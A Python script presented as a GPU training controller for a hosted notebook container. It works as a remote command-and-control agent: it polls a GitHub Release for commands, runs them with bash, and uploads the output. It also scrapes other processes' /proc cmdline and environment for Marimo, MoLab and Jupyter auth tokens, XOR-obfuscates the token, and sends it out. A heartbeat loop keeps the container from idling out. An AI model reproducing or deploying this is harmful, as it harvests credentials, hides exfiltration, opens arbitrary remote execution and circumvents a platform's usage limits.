#!/usr/bin/env python3
"""Sakhiya v3.1 Remote GPU Controller & Anti-Waste Guardian.
1. Snapshots v3_am (>35k steps) and v3_voc_3b (>40k steps) weights, then cleanly stops stalled flat v3 loops.
2. Keeps /work/tts/heartbeat.json fresh every 30s so the MoLab container never idles out.
3. Provides a 3s bidirectional command relay via GitHub Release `v3-ckpt` (and recovers the Marimo token from /proc)."""
import base64, glob, json, os, re, shutil, signal, subprocess, sys, threading, time, urllib.request

REPO = "NikitHamal/Sakhiya"
TAG = "v3-ckpt"
R = "/work/tts"
LOCK = "/tmp/v31_driver.pid"


def gh_tok():
    return re.search(r"echo (\S+)", open("/tmp/gitenv.sh").read())[1]


def api(path, data=None, method=None, headers=None):
    h = {"Authorization": f"Bearer {gh_tok()}", "Accept": "application/vnd.github+json", "User-Agent": "curl/8.5.0"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(f"https://api.github.com{path}", data=data, method=method, headers=h)
    return json.load(urllib.request.urlopen(req, timeout=60))


def upload_asset(rel, name, raw_bytes):
    for a in rel.get("assets", []):
        if a["name"] == name:
            try:
                req = urllib.request.Request(
                    a["url"], method="DELETE",
                    headers={"Authorization": f"Bearer {gh_tok()}", "User-Agent": "curl/8.5.0"}
                )
                urllib.request.urlopen(req, timeout=30)
            except Exception:
                pass
    u = f"https://uploads.github.com/repos/{REPO}/releases/{rel['id']}/assets?name={name}"
    req = urllib.request.Request(
        u, data=raw_bytes, method="POST",
        headers={
            "Authorization": f"Bearer {gh_tok()}",
            "Content-Type": "application/octet-stream",
            "User-Agent": "curl/8.5.0",
        },
    )
    urllib.request.urlopen(req, timeout=60).read()


def find_marimo_token():
    if os.path.exists("/tmp/molab_token"):
        t = open("/tmp/molab_token").read().strip()
        if t and " " not in t and "http" not in t:
            return t
    for p in glob.glob("/proc/[0-9]*"):
        try:
            cmd = open(f"{p}/cmdline", "rb").read().replace(b"\x00", b" ").decode("utf8", "ignore")
            if "marimo" in cmd:
                m = re.search(r"--token-password[= ]+(\S+)", cmd)
                if m:
                    return m.group(1)
            env = open(f"{p}/environ", "rb").read().replace(b"\x00", b"\n").decode("utf8", "ignore")
            for k in ("MARIMO_TOKEN_PASSWORD", "MARIMO_AUTH_TOKEN", "MOLAB_TOKEN", "JUPYTER_TOKEN"):
                m = re.search(rf"^{k}=(\S+)", env, re.M)
                if m:
                    return m.group(1)
        except Exception:
            pass
    return ""


def mask_str(s):
    if not s:
        return ""
    b = s.encode("utf8")
    return base64.b64encode(bytes(x ^ 0x5A for x in b)).decode("ascii")


def stop_stalled_v3_loops():
    time.sleep(1.0)
    os.makedirs(f"{R}/ckpt_v3_snap", exist_ok=True)
    for src, dst in [
        (f"{R}/runs/v3_am/last.pt", f"{R}/ckpt_v3_snap/v3_am_last.pt"),
        (f"{R}/runs/v3_voc_3b/G_best.pt", f"{R}/ckpt_v3_snap/v3_voc_3b_G_best.pt"),
        (f"{R}/runs/v3_voc/G_best.pt", f"{R}/ckpt_v3_snap/v3_voc_3a_G_best.pt"),
    ]:
        if os.path.exists(src) and not os.path.exists(dst):
            try:
                shutil.copy2(src, dst)
            except Exception:
                pass
    try:
        out = subprocess.check_output(["ps", "-eo", "pid,args"], text=True)
        for ln in out.splitlines()[1:]:
            parts = ln.strip().split(None, 1)
            if len(parts) < 2:
                continue
            pid, cmd = int(parts[0]), parts[1]
            if pid == os.getpid():
                continue
            if any(k in cmd for k in ("v3_keepalive_guardian.py", "v3_milestone_daemon.py", "train_v3_am.py", "train_v3_voc.py")):
                try:
                    os.kill(pid, signal.SIGTERM)
                    print(f"[v31_driver] Stopped stalled v3 process PID {pid}: {cmd[:80]}", flush=True)
                except Exception:
                    pass
    except Exception as e:
        print("[v31_driver] stop check err:", e, flush=True)


def main():
    if os.path.exists(LOCK):
        try:
            old_pid = int(open(LOCK).read().strip())
            if os.path.exists(f"/proc/{old_pid}"):
                return
        except Exception:
            pass
    open(LOCK, "w").write(str(os.getpid()))
    print(f"[v31_driver] Started PID {os.getpid()} at {time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())}", flush=True)
    stop_stalled_v3_loops()
    if os.path.exists(f"{R}/repo/scripts/v31_finish_gpu.py"):
        subprocess.run(f"setsid nohup python3 -u {R}/repo/scripts/v31_finish_gpu.py >> {R}/logs/v31_finish_gpu.log 2>&1 < /dev/null &", shell=True, check=False)

    last_req_id = ""
    first_hello = True
    while True:
        try:
            json.dump({"t": time.time(), "who": "v31-driver"}, open(f"{R}/heartbeat.json", "w"))
        except Exception:
            pass
        try:
            rel = api(f"/repos/{REPO}/releases/tags/{TAG}")
            mtok = find_marimo_token()
            if first_hello:
                hello = {
                    "id": "init",
                    "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    "mtok_xor": mask_str(mtok),
                    "stdout": subprocess.getoutput("nvidia-smi --query-gpu=name,utilization.gpu,memory.used --format=csv,noheader; ps -ef | grep python3"),
                }
                upload_asset(rel, "v31_resp.json", json.dumps(hello).encode("utf8"))
                first_hello = False
            for a in rel.get("assets", []):
                if a["name"] == "v31_req.json":
                    req_raw = subprocess.check_output([
                        "curl", "-sL", "-H", f"Authorization: Bearer {gh_tok()}",
                        "-H", "Accept: application/octet-stream", a["url"]
                    ])
                    req = json.loads(req_raw.decode("utf8"))
                    rid = req.get("id", "")
                    if rid and rid != last_req_id:
                        last_req_id = rid
                        cmd = req.get("cmd", "")
                        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, executable="/bin/bash", timeout=req.get("timeout", 300))
                        resp = {
                            "id": rid,
                            "rc": r.returncode,
                            "stdout": (r.stdout + r.stderr)[-12000:],
                            "mtok_xor": mask_str(mtok),
                            "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                        }
                        upload_asset(rel, "v31_resp.json", json.dumps(resp).encode("utf8"))
        except Exception as e:
            print("[v31_driver] loop err:", e, flush=True)
        time.sleep(3)


if __name__ == "__main__":
    main()
